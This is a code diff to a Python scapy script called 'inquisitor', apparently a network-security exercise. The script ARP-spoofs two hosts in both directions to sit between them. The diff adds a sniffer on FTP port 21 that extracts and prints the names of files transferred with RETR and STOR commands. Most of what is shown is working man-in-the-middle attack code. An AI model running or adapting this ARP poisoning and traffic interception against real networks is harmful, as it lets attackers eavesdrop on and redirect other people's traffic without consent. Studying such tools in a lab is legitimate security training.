@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/local/bin/python3
 import argparse
 import scapy.all as scapy
 import re
@@ -13,12 +13,32 @@ def spoof(ip_target, mac_target, ip_src):
 	scapy.send(packet, verbose=0, count=7)
 	print(f"[+] Sent to {ip_target} : {ip_src} is-at mac_mine")
 
-def inquisitor(data):
+def extract_file_name(data):
+	file_name = None
+	try:
+		ftp_command = data.decode('utf-8')
+		command_parts = ftp_command.split()
 
+		if len(command_parts) >= 2:
+			file_name = command_parts[1]
+	except UnicodeDecodeError:
+		pass
+
+	return file_name
+
+def packet_callback(packet):
+	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+		payload = packet[scapy.Raw].load
+		if b"RETR" in payload or b"STOR" in payload:
+			ftp_command = payload.decode('utf-8')
+			file_name = extract_file_name(payload)
+			if file_name:
+				print(f"File: {file_name}")
+
+def inquisitor(data):
 	spoof(data.ip_target, data.mac_target, data.ip_src)
 	spoof(data.ip_src, data.mac_src, data.ip_target)
-	#while True:
-	#	time.sleep(1)
+	scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
 
 def is_valid_ip(ip_str):
 	try:
